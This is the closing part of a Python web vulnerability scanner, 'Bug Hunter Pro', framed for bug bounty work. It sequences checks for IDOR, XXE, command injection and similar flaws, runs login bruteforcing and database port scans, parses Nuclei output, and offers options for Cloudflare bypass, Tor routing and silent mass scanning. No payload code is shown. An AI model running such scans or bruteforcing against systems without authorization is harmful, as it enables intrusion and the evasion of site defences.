                self.check_csrf()
            if not self.stop_event.is_set():
                self.check_idor()
            if not self.stop_event.is_set():
                self.check_api_leakage()
            if not self.stop_event.is_set():
                self.check_waf_bypass()
            if not self.stop_event.is_set():
                self.check_file_upload()
            if not self.stop_event.is_set():
                self.check_crlf_injection()
            if not self.stop_event.is_set():
                self.check_command_injection()
            if not self.stop_event.is_set():
                self.check_xxe()
            if not self.stop_event.is_set():
                self.check_nosql_injection()
            if not self.stop_event.is_set():
                self.check_cors_misconfiguration()
            if not self.stop_event.is_set():
                self.check_graphql_introspection()
            if not self.stop_event.is_set():
                self.check_default_creds()
            if not self.stop_event.is_set():
                self.check_jwt()
            if not self.stop_event.is_set():
                self.check_prototype_pollution()
            if not self.stop_event.is_set():
                self.check_oauth_misconfig()
            if not self.stop_event.is_set():
                self.check_session_fixation()
            if not self.stop_event.is_set():
                self.check_api_token_leak()
            if self.bruteforce_wordlist and not self.stop_event.is_set():
                self.bruteforce_login(
                    self.bruteforce_wordlist,
                    self.bruteforce_username,
                    self.bruteforce_threads,
                    self.bruteforce_stop_on_success,
                    self.bruteforce_throttle)
            if self.enable_dbfinder and not self.stop_event.is_set():
                self.find_databases(
                    not self.no_port_scan,
                    self.db_deep_scan,
                    self.db_timeout,
                    self.full_port_scan)

            if os.path.exists(
                    self.bruteforce_wordlist) and not self.stop_event.is_set():
                self.bruteforce_login(
                    self.bruteforce_wordlist,
                    self.bruteforce_username,
                    self.bruteforce_threads,
                    self.bruteforce_stop_on_success,
                    self.bruteforce_throttle
                )

            if not self.dry_run and not self.stop_event.is_set():
                self._run_nuclei_scan()

            self.log(
                "success", f"Scan completed. Total score: {self.total_score}/100. Findings: {len(self.findings)}")
            self.generate_reports(output_dir=self.output_dir)
        except KeyboardInterrupt:
            self.log("warn", "Scan interrupted by user.")
        except Exception as e:
            self.log("error", f"Scan failed: {e}")
            raise

    def _parse_nuclei_report(self, report_path):
        self.log("info", f"Parsing Nuclei report from {report_path}")
        if not os.path.exists(report_path):
            self.log("warn", "Nuclei report file not found.")
            return
        with open(report_path, 'r', encoding='utf-8') as f:
            for line in f:
                if not line:
                    continue
                try:
                    nuclei_finding = json.loads(line)
                    info = nuclei_finding.get('info', {})
                    severity = info.get('severity', 'info').lower()
                    message = info.get('name', 'Nuclei finding')
                    matched_at = nuclei_finding.get('matched-at', self.target)
                    score = SEVERITY_SCORES.get(severity, 0)

                    self.findings.append(
                        {
                            "severity": severity,
                            "module": "Nuclei",
                            "message": f"Nuclei: {message}",
                            "url": matched_at,
                            "payload": nuclei_finding.get(
                                'template-id',
                                'N/A'),
                            "evidence": {
                                "proof": "Matched Nuclei template.",
                                "details": nuclei_finding},
                            "score": score,
                            "timestamp": _get_full_timestamp()})
                    self.total_score += score

                    if severity in ["high", "critical"]:
                        self.log("info", f"High/Critical Nuclei finding at {matched_at}. Screenshot feature is disabled.")
                    self.log(
                        "warn",
                        f"Nuclei: {message} at {matched_at}",
                        severity=severity)
                except json.JSONDecodeError:
                    self.log(
                        "warn", f"Could not parse Nuclei JSON line: {
                            line.strip()}")


def main():
    parser = argparse.ArgumentParser(
        description="Bug Hunter Pro V1.5.5 — For legal bug bounty hunting")
    parser.add_argument("url", help="Target URL (e.g., https://target.com)")
    parser.add_argument(
        "--output-dir",
        default="report",
        help="Directory to save all reports")
    parser.add_argument("--cookie", help="Cookie for authenticated session")
    parser.add_argument(
        "--proxy",
        help="Proxy to use (e.g., http://127.0.0.1:8080)")
    parser.add_argument(
        "--wordlist",
        help="Path to wordlist for Gobuster and bruteforce")
    parser.add_argument(
        "--module",
        help="Run only a specific module (e.g., xss, ssrf_internal)")
    parser.add_argument(
        "--yes",
        action="store_true",
        help="Skip initial confirmation")
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Run in dry-run mode (no active scanning)")
    parser.add_argument("--bruteforce-wordlist",
                        help="Path to wordlist for bruteforce login")
    parser.add_argument(
        "--bruteforce-username",
        help="Target username for bruteforce")
    parser.add_argument(
        "--bruteforce-threads",
        type=int,
        default=5,
        help="Number of workers for bruteforce")
    parser.add_argument(
        "--bruteforce-stop-on-success",
        action="store_true",
        help="Stop bruteforce after success")
    parser.add_argument(
        "--bruteforce-throttle",
        type=float,
        default=None,
        help="Delay (seconds) between bruteforce attempts")
    parser.add_argument(
        "--no-ports",
        action="store_true",
        help="Disable database port check")
    parser.add_argument(
        "--deep-scan",
        action="store_true",
        help="Enable deep scan for backup files")
    parser.add_argument("--timeout", type=int, default=5,
                        help="Timeout for requests in seconds")
    parser.add_argument(
        "--no-subfinder",
        action="store_true",
        help="Disable subdomain discovery with subfinder")
    parser.add_argument(
        "--no-httpx",
        action="store_true",
        help="Disable live host probing with httpx")
    parser.add_argument(
        "--cf-bypass",
        action="store_true",
        help="Attempt to bypass CloudFlare protection")
    parser.add_argument(
        "--cf-aggressive",
        action="store_true",
        help="Use aggressive CloudFlare bypass techniques")
    parser.add_argument(
        "--use-tor",
        action="store_true",
        help="Attempt bypass using Tor network")
    parser.add_argument(
        "--auto-register",
        action="store_true",
        help="Attempt to automatically register a user")
    parser.add_argument(
        "--no-ssrf",
        action="store_true",
        help="Disable SSRF scanning modules")
    parser.add_argument(
        "--full-port-scan",
        action="store_true",
        help="Run a full nmap scan on all 65535 ports")
    parser.add_argument(
        "--modules",
        help="Run multiple specific modules, comma-separated")
    parser.add_argument(
        "--silent", action="store_true", help="Disable all console output for mass scanning."
    )
    args = parser.parse_args()
    try:
        parsed_url = urlparse(args.url)
        if not parsed_url.scheme or not parsed_url.netloc:
            print(
                f"{Fore.YELLOW}URL does not have a valid scheme or netloc. Adding 'https://' by default.{Style.RESET_ALL}")
            args.url = 'https://' + args.url
            parsed_url = urlparse(args.url)
            if not parsed_url.netloc:
                print(
                    f"{Fore.RED}[{_get_full_timestamp()}] ❌ Invalid URL: {args.url}{Style.RESET_ALL}")
                sys.exit(1)

        hunter = BugHunterPro(**vars(args))

        if args.modules:
            modules_to_run = [m.strip() for m in args.modules.split(',')]
            print(
                f"{
                    Fore.CYAN}Will run specific modules: {
                    ', '.join(modules_to_run)}{
                    Style.RESET_ALL}")

            hosts_to_scan = {hunter.target}

            if 'subfinder' in modules_to_run:
                subdomains = hunter.discover_subdomains()
                if subdomains:
                    hosts_to_scan.update(subdomains)

            if 'httpx' in modules_to_run:
                live_hosts = hunter.probe_live_hosts(list(hosts_to_scan))
                hosts_to_scan = set(live_hosts)

            hunter.visited_urls.update(hosts_to_scan)
            hunter.log(
                "info",
                f"Final list of targets for scanning: {
                    list(
                        hunter.visited_urls)}")

            if 'crawler' in modules_to_run:
                hunter.log(
                    "run", "Running crawler module to gather more URLs...")
                hunter.crawl()
                hunter.log(
                    "success", f"Crawler finished, found {len(hunter.visited_urls)} total URLs.")

            for module_name in modules_to_run:

                if module_name not in ['crawler', 'subfinder', 'httpx']:
                    hunter.run_specific_module(module_name)
            hunter.generate_reports(output_dir=hunter.output_dir)

        elif args.module:
            hunter.run_specific_module(args.module)
            hunter.generate_reports(output_dir=hunter.output_dir)
        else:
            hunter.run(auto_confirm=args.yes)
    except SyntaxError as e:
        print(
            f"{Fore.RED}[{_get_full_timestamp()}] ❌ Syntax error in code: {e}{Style.RESET_ALL}")
        print(
            f"{
                Fore.YELLOW}Check file {__file__} around line {
                e.lineno}. Ensure proper try/except structure.{
                Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(
            f"{Fore.RED}[{_get_full_timestamp()}] ❌ Critical error occurred: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Tips: Ensure target 'http://testphp.vulnweb.com' is accessible. Check internet connection and dependencies (requests, colorama, etc.). Verify code syntax in tools.py.{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()
